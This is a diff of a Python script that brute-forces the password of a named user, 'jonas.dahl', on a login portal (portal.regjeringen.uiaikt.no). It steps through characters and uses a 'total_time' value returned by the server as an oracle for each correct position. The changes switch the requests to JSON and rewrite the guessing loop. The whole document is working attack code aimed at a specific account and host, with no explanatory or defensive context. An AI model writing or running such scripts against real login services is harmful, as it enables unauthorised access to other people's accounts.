@@ -1,9 +1,9 @@
 import requests
+import json
 def cyclic_character_generator():
     while True:
         for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789':
             yield char
-
 
 def replace_character(input_string, index, new_char):
     string_list = list(input_string)
@@ -15,8 +15,13 @@ def replace_character(input_string, index, new_char):
 def send_post_request(data):
     url = "https://portal.regjeringen.uiaikt.no/login"
     try:
-        response = requests.post(url, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors (4xx and 5xx)
+        headers = {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+        }
+
+        response = requests.post(url, data=json.dumps(data), headers=headers)
+        response.raise_for_status()
 
         content_type = response.headers.get('content-type', '').lower()
 
@@ -35,182 +40,140 @@ def send_post_request(data):
             except ValueError as json_error:
                 print(f"Error processing JSON: {json_error}")
         else:
-            print(f"Non-JSON response content: {response.text}")
+            # Debugging response print(f"Non-JSON response content: {response.text}")
+
+            # Attempt to extract 'total_time' directly from the response text
+            total_time = None
+            try:
+                total_time_index = response.text.find('"total_time":')
+                if total_time_index != -1:
+                    total_time_str = response.text[total_time_index + len('"total_time":'):].split(',')[0]
+                    total_time = int(total_time_str.strip('{}" '))
+                    print(f"Total Time: {total_time}")
+            except ValueError as value_error:
+                print(f"Error extracting total_time from response: {value_error}")
 
         if response.status_code == 200:
             print("Request was successful!")
-            return True
+            return total_time  # Return total_time, even if it's None
         else:
             print(f"Request failed with status code: {response.status_code}")
-            return False
+            return None
 
     except requests.exceptions.RequestException as e:
         print(f"An error occurred: {e}")
-        return False
-
+        return None
 
 def test_passwords(username, password):
-    url = "https://portal.regjeringen.uiaikt.no/login"
-    print(f"Testing passwords against {url}")
-    print("-" * 40)
+    global total_time
+    print("-" * 35)
     print(f"Testing password: {password}")
     total_time = send_post_request({'username': username, 'password': password})
+    return total_time
 
 if __name__ == "__main__":
     username = "jonas.dahl"
     starting_password = "aaaaaaaaaaaaaaa23"
-    cycle = total_time = 1
+    modified_string = "aaaaaaaaaaaaaaa23"
+    total_time = 0
 
     generator = cyclic_character_generator()
 
     while True:
-        if cycle == 0:
+        if total_time == 0:
             test_passwords(username, starting_password)
-            if total_time is not None:
-                total_time = cycle
-        elif cycle == 1:
-            while cycle == 1:
+        elif total_time == 1:
+            while total_time == 1:
                 replacement_index = 0
                 new_character = next(generator)
                 modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 2:
-            while cycle == 2:
+        elif total_time == 2:
+            while total_time == 2:
                 replacement_index = 1
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 3:
-            while cycle == 3:
+        elif total_time == 3:
+            while total_time == 3:
                 replacement_index = 2
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 4:
-            while cycle == 4:
+        elif total_time == 4:
+            while total_time == 4:
                 replacement_index = 3
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 5:
-            while cycle == 5:
+        elif total_time == 5:
+            while total_time == 5:
                 replacement_index = 4
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 6:
-            while cycle == 6:
+        elif total_time == 6:
+            while total_time == 6:
                 replacement_index = 5
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 7:
-            while cycle == 7:
-                replacement_index = 5
-                new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
-                test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 8:
-            while cycle == 8:
+        elif total_time == 7:
+            while total_time == 7:
                 replacement_index = 6
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 9:
-            while cycle == 9:
+        elif total_time == 8:
+            while total_time == 8:
                 replacement_index = 7
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 10:
-            while cycle == 10:
+        elif total_time == 9:
+            while total_time == 9:
                 replacement_index = 8
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 11:
-            while cycle == 11:
+        elif total_time == 10:
+            while total_time == 10:
                 replacement_index = 9
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 12:
-            while cycle == 12:
+        elif total_time == 11:
+            while total_time == 11:
                 replacement_index = 10
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 13:
-            while cycle == 13:
+        elif total_time == 12:
+            while total_time == 12:
                 replacement_index = 11
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 14:
-            while cycle == 14:
+        elif total_time == 13:
+            while total_time == 13:
                 replacement_index = 12
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 15:
-            while cycle == 15:
+        elif total_time == 14:
+            while total_time == 14:
                 replacement_index = 13
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-        elif cycle == 16:
-            while cycle == 16:
+        elif total_time == 15:
+            while total_time == 15:
                 replacement_index = 14
                 new_character = next(generator)
-                modified_string = replace_character(starting_password, replacement_index, new_character)
-                print(modified_string)
+                modified_string = replace_character(modified_string, replacement_index, new_character)
                 test_passwords(username, modified_string)
-                if total_time is not None:
-                    total_time = cycle
-            if cycle == 17:
-                print("The password is " + modified_string)
+        else:
+            print("-" * 35)
+            print("The password is: " + modified_string)
+            break
+
